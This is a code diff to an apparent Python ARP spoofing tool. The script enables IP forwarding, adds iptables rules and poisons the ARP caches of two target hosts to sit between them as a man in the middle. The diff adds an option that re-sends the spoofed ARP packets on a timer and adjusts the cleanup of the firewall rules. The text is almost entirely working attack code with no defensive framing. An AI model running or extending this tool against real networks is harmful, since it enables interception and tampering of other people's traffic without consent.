@@ -43,7 +43,7 @@ def manage_iptables(action):
             if action == "add":
                 subprocess.run(['sudo'] + cmd, check=True)
             elif action == "remove":
-                subprocess.run(['sudo', 'iptables', '-D'] + cmd[1:], check=True)
+                subprocess.run(['sudo', 'iptables', '-D', cmd[2]] + cmd[3:], check=True)
     except subprocess.CalledProcessError as e:
         print(f"Error in iptables: {e}")
         sys.exit(1)
@@ -56,25 +56,33 @@ if __name__ == "__main__":
     parser.add_argument('target2', help='IP of second target')
     parser.add_argument('-i', '--interface', default='eth0',
                        help='Network interface (default: eth0)')
+    parser.add_argument('-r', '--recursive', type=int, default=0,
+                           help='Seconds between ARP recursive requests (0=once, default:0)')
     
     args = parser.parse_args()
     
     src_ip = args.target1
     dst_ip = args.target2
     iface = args.interface
+    recursive = args.recursive
+    
     try:
         print(f"[*] Enabling IP forwarding")
         enable_ip_forwarding()
         print(f"[*] Adding iptables rules")
         manage_iptables("add")
         print(f"[*] Starting ARP spoofing attack between {args.target1} and {args.target2}")
-        #while True: #can send packets at regular intervals # check previous commits
-        spoof(src_ip, dst_ip, iface)
-        spoof(dst_ip, src_ip, iface)
-        #time.sleep(2)
         print("[*] Press CTRL+C to restore and exit")
-        while True:
-            time.sleep(3600)
+        while True: 
+            spoof(src_ip, dst_ip, iface)
+            spoof(dst_ip, src_ip, iface)
+            if recursive <=0:
+                break  
+            time.sleep(recursive)
+            
+        if recursive <=0:
+            while True:
+                time.sleep(3600)
             
     except KeyboardInterrupt:
         print("\n[*] Restoring ARP tables")
